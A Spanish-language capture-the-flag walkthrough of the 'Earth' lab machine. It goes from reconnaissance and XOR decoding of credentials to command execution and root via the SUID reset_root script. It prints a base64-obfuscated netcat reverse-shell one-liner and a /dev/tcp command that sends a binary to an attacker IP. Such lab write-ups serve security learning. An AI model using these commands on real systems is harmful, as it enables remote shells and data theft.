## Primera Incursion
- **Arp-Scan**: Se encuentra exitosa mente la maquina vulnerable.
- **Nmap**: Se realiza un nmap y se encuentra servicios como
	- **22**, **80**, **443**.
- **Fuzzing**: Se hace fuzzing a la IP con HTTP y HTTPS, solo se encuentra un 403 de cgi-bin
## Segunda Incursion
La segunda incursion es cuando las formas superficiales de entrada no son suficientes
- **Invesitigacion del Certificado TLS**: se encuentra que el certificado TLS tiene dos nombres de dominio diferentes.
- **Se asignan los DNS al etc/host**: earth.local terratest.earth.local
- **Se encuentra:**
	- una imagen de la tierra.
	- dos campos, uno para escribir un mensaje y otro que lo encrypt con una key en pareciera ser hexadecimal.
- **Fuzzing**: se vuelve hacer fuzzing con ambas direcciones y con y sin certificado teniendo el mismo resultado con un 403 en cgi-bin pero ahora nos da que hay un panel de admin, y ademas nos arroja un robots en terratest.earth.local
	- http://earth.local/admin/login
	- https://terratest.earth.local/robots.txt
	fuzzing log:
	```
	+ http://earth.local/admin (CODE:301|SIZE:0) 
	+ http://earth.local/cgi-bin/ (CODE:403|SIZE:199) 
	+ https://terratest.earth.local/robots.txt
	```

## Tercera Incursion
En la tercera incursion ya tenemos base, y es en terratest, donde en robots encontramos un archivo .txt que es almacenado así `testingnotes.*` al averiguar que había ahí encontré el siguiente texto:
```
Notas sobre la prueba del sistema de mensajería segura:
*El uso del cifrado XOR como algoritmo debería ser seguro como se usa en RSA.
*La Tierra ha confirmado que ha recibido nuestros mensajes enviados.
*testdata.txt se utilizó para probar el cifrado.
*terra utilizada como nombre de usuario para el portal de administración.
Hacer:
*¿Cómo enviamos nuestras claves mensuales a la Tierra de forma segura? ¿O deberíamos cambiar las claves semanalmente?
*Es necesario probar diferentes longitudes de clave para proteger contra la fuerza bruta. ¿Cuánto tiempo debe tener la llave?
*Necesita mejorar la interfaz de mensajería y el panel de administración, actualmente es muy básico.

```

este texto nos aclara las siguientes cosas.
1. El cifrado que vimos en **Incursion dos** son de tipo XOR por lo que el resultado HEX se hacer una inversa.
2. existe un archivo testdata.txt que contiene un texto que se uso para probar la encryption.
3. terra es el nombre de usuario del portal de administración. (posible user SSH)
4. al ser un HTTP, las claves no se envían de forma segura atravez de la pagina, tendrá que hacer un wireshark?.

Probamos todos los mensajes encriptados en HEX pasados por XOR y encontré un mensaje cual se repite varias veces. `earthclimatechangebad4humans`, traducido seria el algo como el cambio climático de la tierra esta mal por los humanos.

Se hace la prueba en el panel de administración con usuario **terra** y contraseña **earthclimatechangebad4humans**, ambas credenciales son acertadas.

## Cuarta Incursion.
Una vez dentro del panel administrativo se desplegó un field cuya función es ejecutar código en el servidor.
**Datos:**
- **id**: uid=48(apache) gid=48(apache) groups=48(apache) 
- **whoami**: apache
- **ls home**: earth
- **find / -user root -perm /4000 2>/dev/null**: 
```
/usr/bin/at
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/reset_root
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/sbin/grub2-set-bootflag
/usr/sbin/mount.nfs
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
```

#### User flag!
**cd var; cd earth_web; cat user_flag.txt**: user_flag_3353b67d6437f07ba7d34afd7d2fc27d

## Quinta incursion
A este punto buscamos conquistar la maquina, por lo que se intentado una reverse shell de varias formas.
1) awk
2) bash
3) nc
pero sin éxito, esto ya que hacer forbidden al momento de establecer una conexión, hasta quise descargar con wget un script con una reverse shell.

Luego intente lo siguiente. ejecutar el código de una reverse shell nc lo mas pequeño posible en un base64,  cosa que dio resultado exitoso.

**Código inducido**

`echo 'bmMgMTAuMC4yLjE1IDQ0NDQgLWUgL2Jpbi9zaAo=' | base64 -d | bash`

**Posible usuario**: (cat etc/passwd)
earth:x:1000:1000::/home/earth:/bin/bash

**Posible punto de entrada**
en la cuarta incursion, se encontró que existe la posibilidad de ejecutar reset_root, este es un script que puede resetear las credenciales del usuario raíz y ademas contienen todas las contraseñas de shadow.

la ejecución desde la misma maquina falla, por lo que se examinara el script pasándolo por net cat
```
maquina atacante:
nc -lvnp 3333 > reset_root

maquina vulnerada:
cat /usr/bin/reset_root > /dev/tcp/12.0.2.6 3333
```

La lectura del archivo **reset_root** solo es posible mediante una herramienta como **ltrace**, por lo que se debe descargar la herramienta

la lectura de este archivo da el siguiente resultado.
```
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)      = 38
access("/dev/shm/kHgTFI5G", 0)                   = -1
access("/dev/shm/Zw7bV9U5", 0)                   = -1
access("/tmp/kcM0Wewe", 0)                       = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)      = 44
+++ exited (status 0) +++
```

el problema es que reset_root no encuentra los tres directorios, por lo que tendremos que crearlos.

una vez creado los directorios con touch.
ejecutamos su root y escribimos la password que reseteo que es Earth.

y finalmente tenemos root

root flag.
root_flag_b0da9554d29db2117b02aa8b66ec492e


